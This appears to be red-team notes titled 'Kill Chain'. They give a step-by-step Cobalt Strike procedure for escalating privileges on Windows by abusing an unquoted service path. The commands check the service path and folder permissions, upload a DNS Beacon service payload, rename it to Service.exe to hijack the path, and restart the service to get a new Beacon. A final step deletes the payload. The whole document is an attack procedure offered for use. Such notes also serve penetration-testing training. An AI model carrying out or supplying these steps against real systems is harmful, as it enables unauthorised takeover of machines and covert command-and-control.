# Kill Chain

## Unquoted Service Path <a href="#unquoted-service-path" id="unquoted-service-path"></a>

1. Verify the binary path of the service.
   1. `sc_qc BadWindowsService`
2. Verify the permissions of the target directory.
   1. `cacls "C:\Program Files\Bad Windows Service"`
3. Change Beacon's current working directory.
   1. `cd C:\Program Files\Bad Windows Service`
4. Upload a DNS Beacon service payload.
   1. `upload C:\Payloads\dns_x64.svc.exe`
5. Rename the payload to activate the hijack.
   1. `mv dns_x64.svc.exe Service.exe`
6.  Restart the service.

    1. `sc_stop BadWindowsService`
    2. `sc_start BadWindowsService`

    The new Beacon should appear immediately.
7. Interact with the new Beacon.
   1. `Run a checkin command.`
8. Delete the service payload.
   1. `rm Service.exe`

&#x20;

&#x20;
